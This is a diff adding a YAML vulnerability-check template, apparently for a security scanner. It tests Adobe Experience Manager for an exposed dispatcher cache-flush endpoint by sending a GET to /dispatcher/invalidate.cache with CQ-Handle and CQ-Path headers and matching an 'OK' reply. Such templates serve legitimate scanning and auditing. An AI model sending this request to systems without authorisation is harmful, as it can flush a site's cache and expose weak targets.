@@ -1,0 +1,19 @@
+id: poc-yaml-aem-flush-cached-pages
+info:
+  name: Adobe Experience Manager Flush Cached Pages 漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: AEM
+  osprey-id: vb_2022_0035
+requests:
+- method: GET
+  path: /dispatcher/invalidate.cache
+  headers:
+    CQ-Handle: /content
+    CQ-Path: /content
+  expression: 'contains(substr(body, 0, 20), "<H1>OK</H1>")
+
+    '
+variables: {}
+transport: http
